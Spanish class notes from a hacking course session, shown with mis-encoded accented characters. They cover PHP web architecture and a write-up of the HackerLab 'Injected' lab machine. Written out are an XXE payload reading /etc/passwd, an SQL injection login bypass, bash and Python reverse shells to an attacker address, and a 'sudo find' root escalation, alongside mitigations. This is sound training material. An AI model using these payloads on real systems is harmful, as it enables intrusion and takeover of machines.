> [!info] Ficha tÃ©cnica
> **Instructor:** Carlos GÃ³mez Pintado (el coletas) Â· **Fecha:** 14/07/2026
> **MÃ³dulo:** AuditorÃ­a web Â· Fundamentos Web Â· SQL Injection Â· XXE Â· Escalada de privilegios
> **Entorno:** Kali Linux Â· MÃ¡quina Injected de HackerLab + AplicaciÃ³n propia "CiberLab"
> **Participantes destacados:** Chema, Asier, Mariana, Pablo, Oscar, Juan Carlos, Confil, Sira

> [!tip] CÃ³mo leer estos apuntes
> SesiÃ³n **clave de cierre** del mÃ³dulo web. Primera parte: explicaciÃ³n teÃ³rica completa sobre arquitectura web (una pÃ¡gina web es una carpeta expuesta) usando una aplicaciÃ³n vulnerable propia construida en directo. Segunda parte: resoluciÃ³n de la mÃ¡quina **Injected** (HackerLab) que encadena: enumeraciÃ³n con diccionario ampliado â†’ backup con hash MD5 hardcodeado â†’ login â†’ RCE en panel admin â†’ reverse shell â†’ sudo -l con find â†’ root. Conecta y cierra todo lo visto: XXE, SQLi, Path Traversal, LFI, RCE, escalada.

---

## â‘  Una pÃ¡gina web es una carpeta expuesta en un servidor

### El concepto central

Carlos lo materializÃ³ creando en directo el proyecto **CiberLab** con esta estructura:

```
/var/www/html/ciberlab/
â”œâ”€â”€ public/ â† raÃ­z de la URL
â”‚ â”œâ”€â”€ index.php
â”‚ â”œâ”€â”€ assets/
â”‚ â”œâ”€â”€ includes/
â”‚ â””â”€â”€ uploads/
â””â”€â”€ data/ â† base de datos, NUNCA expuesta
 â””â”€â”€ db.sqlite
```

| Directorio | Â¿QuÃ© es? | Â¿Accesible desde URL? |
|------------|----------|----------------------|
| `public/` | Document root, contiene index.php, assets, includes, uploads | **SÃ** (es la raÃ­z) |
| `data/` | Base de datos SQLite, ficheros sensibles | **NO** (mismo nivel que public, pero no servida) |

> [!important] La arquitectura de seguridad por diseÃ±o
> `public` y `data` estÃ¡n al mismo nivel jerÃ¡rquico bajo `ciberlab`, pero Apache solo sirve `public`. Desde la URL solo puedes navegar **hacia adelante** (assets, includes, uploads). Para llegar a `data` hay que subir un nivel (`../`), lo cual **solo es posible si existe una vulnerabilidad de Path Traversal**.

> [!note] Lo que el servidor expone no son "pestaÃ±as"
> Son **ficheros PHP**. Cada URL diferente = un fichero PHP distinto. La barra de navegaciÃ³n del front solo contiene enlaces a esos ficheros.

### Â¿QuÃ© hace vulnerable a una web?

> [!warning] La regla de oro
> **Lo vulnerable no es el servidor, ni el puerto, ni la base de datos, ni el front.**
> Lo vulnerable son **los ficheros PHP** â€” lo que programan las personas y donde se introducen errores de validaciÃ³n.

| Funcionalidad | Fichero PHP detrÃ¡s | QuÃ© hace | Vulnerabilidad tÃ­pica si no valida |
|---------------|-------------------|----------|-----------------------------------|
| Login | `login.php` | Consulta SQL a BD para verificar credenciales | SQL Injection |
| Trabaja con nosotros | `trabaja.php` | Acepta XML y lo procesa | XXE |
| Subida de ficheros | `upload.php` | Recibe fichero y lo guarda en uploads/ | File Upload Bypass â†’ RCE |

> [!note] La metÃ¡fora del portero
> "El programador es como el portero del banco. El cliente no ataca la caja fuerte directamente, ataca al portero. Si el portero (el PHP) no tiene instrucciones claras de quÃ© no dejar pasar, cualquiera puede entrar."

---

## â‘¡ QuÃ© hay detrÃ¡s de cada funcionalidad

El front **no hace nada**: es HTML y CSS, no tiene backend. Los botones que no llevan a ningÃºn lado son "cartÃ³n piedra". La comunicaciÃ³n real solo ocurre al llamar a un fichero PHP.

### Las 3 funcionalidades crÃ­ticas y su PHP

```
Login (login.php):
 Input: username, password (POST)
 Query: SELECT id, username FROM users WHERE username='$u' AND password='$p'
 Vuln: ConcatenaciÃ³n directa â†’ SQL Injection

Trabaja con nosotros (trabaja.php):
 Input: XML candidatura (POST)
 Proceso: libxml_load_string() sin disable entity loader
 Vuln: External Entity habilitado â†’ XXE

Subida CV (upload.php):
 Input: fichero (POST multipart)
 Proceso: move_uploaded_file() a uploads/
 Vuln: Sin validar extensiÃ³n/MIME â†’ RCE
```

> [!important] Mitigaciones en el cÃ³digo
> - **SQLi:** Prepared statements (separan cÃ³digo SQL de datos)
> - **XXE:** `libxml_disable_entity_loader(true)` antes de parsear
> - **File Upload:** Validar extensiÃ³n, MIME, renombrar, no ejecutar en uploads/

---

## â‘¢ XXE demostrado en la aplicaciÃ³n propia

En `trabaja.php` hay un formulario que acepta candidatura en XML. El cÃ³digo:

```php
$xml = simplexml_load_string($cv_xml); // Sin disable_entity_loader!
// Extrae nombre, puesto, mensaje del XML
```

**Payload XXE:**

```xml
<?xml version="1.0"?>
<!DOCTYPE test [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<candidatura>
 <nombre>&xxe;</nombre>
 <puesto>hacker</puesto>
 <mensaje>test</mensaje>
</candidatura>
```

**Resultado:** El servidor devuelve `/etc/passwd` en la respuesta (el contenido del XML procesado).

> [!note] MitigaciÃ³n
> ```php
> libxml_disable_entity_loader(true); // Antes de simplexml_load_string()
> ```
> Impide que el parser XML resuelva entidades externas. Sin esta lÃ­nea, cualquier fichero accesible por `www-data` es legible desde fuera.

---

## â‘£ SQL Injection demostrado en la aplicaciÃ³n propia

En `login.php` la query se construye concatenando:

```php
$query = "SELECT id, username FROM users WHERE username='$username' AND password='$password'";
```

**Payload clÃ¡sico:**

```
Usuario: admin' OR '1'='1' --
Password: (cualquier cosa)
```

**Query resultante:**

```sql
SELECT id, username FROM users WHERE username='admin' OR '1'='1' --' AND password='...'
-- El comentario -- anula la comprobaciÃ³n de password
```

**Resultado:** Acceso como primer usuario de la tabla (normalmente admin).

> [!note] Prepared statements = soluciÃ³n real
> ```php
> $stmt = $pdo->prepare("SELECT id, username FROM users WHERE username=? AND password=?");
> $stmt->execute([$username, $password]);
> ```
> Separan cÃ³digo SQL de datos â†’ imposible que la entrada modifique la estructura de la query.

---

## â‘¤ MÃ¡quina Injected â€” Reconocimiento

### Ficha tÃ©cnica

| Dato | Valor |
|------|-------|
| **MÃ¡quina** | Injected (HackerLab) |
| **IP** | 10.0.2.12 |
| **Puertos** | 22 (SSH), 80 (HTTP Apache 2.4 Debian) |
| **Vector inicial** | EnumeraciÃ³n directorios â†’ backup.php con credenciales MD5 |
| **Acceso** | admin / qwerty (hash crackeado) |
| **RCE** | Panel admin â†’ ejecuciÃ³n de comandos |
| **Escalada** | sudo -l â†’ find como cualquier usuario sin password |

### Paso 1: Netdiscover + Ping + Nmap

```bash
sudo netdiscover -r 10.0.2.0/24
# IP .12 encontrada

ping 10.0.2.12
# TTL 64 â†’ Linux

nmap -sCV -p- --min-rate 1500 10.0.2.12
# 22/tcp SSH
# 80/tcp HTTP Apache 2.4.x (Debian)
```

### Paso 2: Dirsearch con extensiones y diccionario ampliado

```bash
# Dirsearch por defecto NO incluye "backup" en su diccionario
dirsearch -u http://10.0.2.12 -e php,html,txt,zip,sql,bak,old,backup

# O con diccionario grande
dirsearch -u http://10.0.2.12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

| Hallazgo | QuÃ© es |
|----------|--------|
| `login.php` | Panel de login |
| `backup.php` | **Clave** â€” muestra mensaje "backup comprometido" + ruta a credentials/ |

### Paso 3: backup.php â†’ Credenciales hardcodeadas

El cÃ³digo fuente de `backup.php` revela un directorio `credentials/` con un fichero HTML que contiene un hash:

```
Hash: 5f4dcc3b5aa765d61d8327deb882cf99
```

**AnÃ¡lisis del hash:**
- Solo caracteres `a-f` y `0-9` â†’ **hexadecimal**
- Longitud 32 â†’ **MD5**
- Confirmado con CyberChef (Magic) â†’ `qwerty`

> [!tip] Identificar hashes a ojo
> | Caracteres | Longitud | Tipo probable |
> |------------|----------|---------------|
> | a-f, 0-9 | 32 | MD5 |
> | a-f, 0-9 | 40 | SHA1 |
> | a-z, A-Z, 0-9, +, /, = | Variable | Base64 |
> | $2a$, $2b$, $2y$ | 60 | bcrypt |

**Credenciales:** `admin` / `qwerty` â†’ Acceso al panel de administraciÃ³n.

---

## â‘¥ RCE desde el panel y obtenciÃ³n de shell

### Panel de administraciÃ³n

El panel tiene una funcionalidad explÃ­cita: **"Ejecutar comandos en el sistema"**.

```bash
whoami
# www-data

cat /etc/passwd
# root:x:0:0:root:/root:/bin/bash
# nolen:x:1000:1000:nolen,,,:/home/nolen:/bin/bash
```

Usuarios con shell real: `root` y `nolen`.

### Reverse shell

```bash
# Atacante
nc -lvnp 4444

# Panel (campo comando)
bash -c 'bash -i >& /dev/tcp/10.10.14.195/4444 0>&1'
# O payload Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.195",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### EstabilizaciÃ³n TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z â†’ stty raw -echo; fg â†’ export TERM=xterm
```

---

## â‘¦ Escalada de privilegios â€” sudo con find

### sudo -l como nolen

```bash
$ sudo -l
User nolen may run the following commands on Injected:
 (ALL) NOPASSWD: /usr/bin/find
```

> [!important] DistinciÃ³n conceptual fijada en clase
> | Origen | QuÃ© da | TÃ©cnica GTFOBins |
> |--------|--------|------------------|
> | `sudo -l` | Permiso delegado: "este usuario puede ejecutar este binario como otro usuario" | PestaÃ±a **Sudo** |
> | `find / -perm -4000` | SUID bit en el fichero: "cualquiera que lo ejecute lo hace como root" | PestaÃ±a **SUID** |
> 
> **El mismo binario (find) tiene dos caminos de explotaciÃ³n distintos segÃºn CÃ“MO se descubriÃ³.**

### GTFOBins â†’ find â†’ Sudo

Payload:

```bash
sudo find . -exec /bin/sh \; -quit
```

**Resultado:** Shell como **root**.

```
$ id
uid=0(root) gid=0(root) groups=0(root)
```

---

## â‘§ Resumen: Cadena de explotaciÃ³n completa

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. netdiscover â†’ 10.0.2.12 â”‚
â”‚ 2. nmap -sCV â†’ Puertos 22, 80 (Apache Debian) â”‚
â”‚ 3. dirsearch -e php,html,... + diccionario grande â”‚
â”‚ â†’ login.php, backup.php (Â¡no sale con dict por defecto!) â”‚
â”‚ 4. backup.php â†’ credentials/ â†’ hash MD5 â†’ qwerty â”‚
â”‚ 5. login.php â†’ admin / qwerty â†’ Panel admin â”‚
â”‚ 6. Panel admin â†’ RCE (whoami=www-data, cat /etc/passwd) â”‚
â”‚ 7. Reverse shell â†’ nolen (TTY estable) â”‚
â”‚ 8. sudo -l â†’ (ALL) NOPASSWD: /usr/bin/find â”‚
â”‚ 9. GTFOBins find (sudo) â†’ sudo find . -exec /bin/sh \; â”‚
â”‚ 10. Â¡ROOT! â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

| Fase | TÃ©cnica | Herramientas |
|------|---------|--------------|
| Reconocimiento | netdiscover, nmap, TTL | Terminal |
| EnumeraciÃ³n web | dirsearch (dict grande + extensiones) | Dirsearch |
| DetecciÃ³n credenciales | CÃ³digo fuente backup.php + CyberChef | Navegador, CyberChef |
| Acceso | Login + Panel admin RCE | Navegador |
| Shell | Reverse shell Python/bash + TTY | Netcat, Python |
| Escalada | sudo -l â†’ GTFOBins find (sudo) | sudo, GTFOBins |

---

## â‘¨ Conceptos transversales reforzados

### Diccionarios y enumeraciÃ³n

> [!warning] El diccionario por defecto NO basta
> - `dirsearch` por defecto no incluye "backup"
> - `gobuster`/`feroxbuster` igual
> - **SoluciÃ³n:** Usar `directory-list-2.3-medium.txt` de SecLists o aÃ±adir palabras clave del contexto

### IdentificaciÃ³n de hashes

| Hash | Charset | Longitud | Ejemplo |
|------|---------|----------|---------|
| **MD5** | a-f, 0-9 | 32 | `5f4dcc3b5aa765d61d8327deb882cf99` |
| SHA1 | a-f, 0-9 | 40 | `da39a3ee5e6b4b0d3255bfef95601890afd80709` |
| SHA256 | a-f, 0-9 | 64 | `e3b0c44298fc1c149afbf4c8996fb924...` |
| bcrypt | $2a$/b/y$... | 60 | `$2b$12$...` |

**Herramienta:** CyberChef (Magic) â†’ identifica y crackea automÃ¡ticamente.

### Reverse shell TTY

```bash
# 1. Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Background + raw mode
Ctrl+Z
stty raw -echo; fg

# 3. Restore
export TERM=xterm
stty rows 50 cols 150
```

### Sudo vs SUID â€” la distinciÃ³n clave

```
sudo -l â†’ "yo, usuario X, puedo ejecutar binario Y como usuario Z"
 â†’ GTFOBins pestaÃ±a SUDO

find -perm -4000 â†’ "el binario Y tiene bit SUID, cualquiera lo ejecuta como root"
 â†’ GTFOBins pestaÃ±a SUID
```

> [!important] Mismo binario, vector diferente
> `find` descubierto via `sudo -l` â†’ tÃ©cnica `sudo find . -exec /bin/sh \;`
> `find` descubierto via `find -perm -4000` â†’ tÃ©cnica `find . -exec /bin/sh \;` (sin sudo)

---

## â‘© Comandos de la sesiÃ³n

```bash
# === RECONOCIMIENTO ===
sudo netdiscover -r 10.0.2.0/24
ping 10.0.2.12 # TTL 64 = Linux
nmap -sCV -p- --min-rate 1500 10.0.2.12

# === ENUMERACIÃ“N WEB ===
dirsearch -u http://10.0.2.12 -e php,html,txt,zip,sql,bak,old,backup
# O con diccionario grande
dirsearch -u http://10.0.2.12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# === ANÃLISIS BACKUP ===
# Ver cÃ³digo fuente backup.php â†’ credentials/ â†’ hash MD5
# CyberChef: Input â†’ Magic â†’ MD5 â†’ qwerty

# === ACCESO ===
# http://10.0.2.12/login.php â†’ admin / qwerty

# === RCE EN PANEL ===
whoami # www-data
cat /etc/passwd # root, nolen con /bin/bash

# === REVERSE SHELL ===
# Atacante
nc -lvnp 4444

# Panel (Python)
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.195",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Estabilizar
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z â†’ stty raw -echo; fg â†’ export TERM=xterm

# === ESCALADA ===
sudo -l
# (ALL) NOPASSWD: /usr/bin/find

# GTFOBins â†’ find â†’ Sudo
sudo find . -exec /bin/sh \; -quit
# Â¡ROOT!
```

---

## â‘ª Mitigaciones Blue Team vistas en clase

### XXE (PHP)

```php
// ANTES de parsear XML
libxml_disable_entity_loader(true);

// O en PHP 8+ con opciones de parser
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD); // Â¡PELIGROSO!
// Seguro:
$dom->loadXML($xml, LIBXML_NONET); // Sin red, sin entities externas
```

### SQL Injection (PHP)

```php
// VULNERABLE
$query = "SELECT * FROM users WHERE user='$u' AND pass='$p'";

// SEGURO - Prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE user=? AND pass=?");
$stmt->execute([$u, $p]);
```

### Path Traversal / LFI

```php
// VULNERABLE
readfile("uploads/" . $_GET['file']);

// SEGURO - Rutas absolutas hardcodeadas
$allowed = ['doc1.pdf', 'doc2.pdf'];
if (in_array($_GET['file'], $allowed)) {
 readfile("/var/www/uploads/" . $_GET['file']);
}
```

### File Upload

```php
// Validaciones mÃ­nimas
$allowed_ext = ['pdf', 'jpg', 'png'];
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (!in_array($ext, $allowed_ext)) die("ExtensiÃ³n no permitida");

// Renombrar para evitar ejecuciÃ³n
$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], "/var/www/uploads/$new_name");

// Configurar Apache: uploads/ sin ejecuciÃ³n PHP
# <Directory /var/www/uploads>
# php_admin_flag engine off
# </Directory>
```

---

## â‘« Notas de clase

- **Chema** resolviÃ³ Injected casi completo con ayuda de Claude (mostrÃ³ el flujo de automatizaciÃ³n con IA).
- **Asier, Mariana, Pablo, Oscar, Juan Carlos, Confil, Sira** participaron activamente en dudas sobre arquitectura web, hashes, dirsearch, GTFOBins, sudo vs SUID.
- **Carlos** construyÃ³ la app "CiberLab" en directo para explicar arquitectura web â€” "la pizarra no se va a repetir en la vida".
- Se mencionÃ³ que **la semana siguiente empieza ByCode/DevOps** (IA, arquitecturas, despliegue seguro).
- **MÃ³dulo escalada de privilegios** se retoma en septiembre.
- DiscusiÃ³n sobre **Claude Code**, automatizaciÃ³n con IA, tokens, hardware personal para voz (Whisper + Claude + TTS).
- **Partido EspaÃ±a-Francia** a las 21:00 â€” clase terminada antes para verlo.

---

## â‘¬ ConexiÃ³n con otras sesiones

> [!note] Cierre del bloque web
> - **01/07**: WPScan, File Upload, Reverse Shell WordPress (Academy)
> - **02/07**: Fuzzing, Directory Listing, Script Hijacking (Rockstar)
> - **06/07**: Fuzzing ParÃ¡metros, IngenierÃ­a Social, Anonimato
> - **07/07**: ExplotaciÃ³n Avanzada, Escalada MultiPivote (Rockstar)
> - **08/07**: LFI Fundamentos, Path Traversal, MÃ¡quina Banco
> - **09/07**: XXE Labs I â€” Castor
> - **10/07**: Repaso Nike + Castor
> - **11/07**: XXE Labs II â€” Cierre Castor + Nike
> - **14/07**: **Esta sesiÃ³n** â€” Fundamentos Web + SQLi + XXE en app propia + Injected (cierre integrado)
> - **PrÃ³xima semana**: ByCode + DevOps (IA, arquitecturas, servidores)
> - **Septiembre**: MÃ³dulo dedicado Escalada de Privilegios

â†’

â†’

---

> [!tip] La frase de cierre del mÃ³dulo web
> "Cuando hacÃ©is una mÃ¡quina una vez, y la volvÃ©is a hacer otra vez, aunque haya pasado dos meses... indirectamente vuestra cabeza va a pensar: 'esto es prueba, esto me falta'. La experiencia al final es lo que mÃ¡s se nota. El peor hacker es el que mÃ¡s cosas haga â€” la experiencia es lo que cuenta."
> â€” Carlos GÃ³mez Pintado

â†’

â†’

â†’
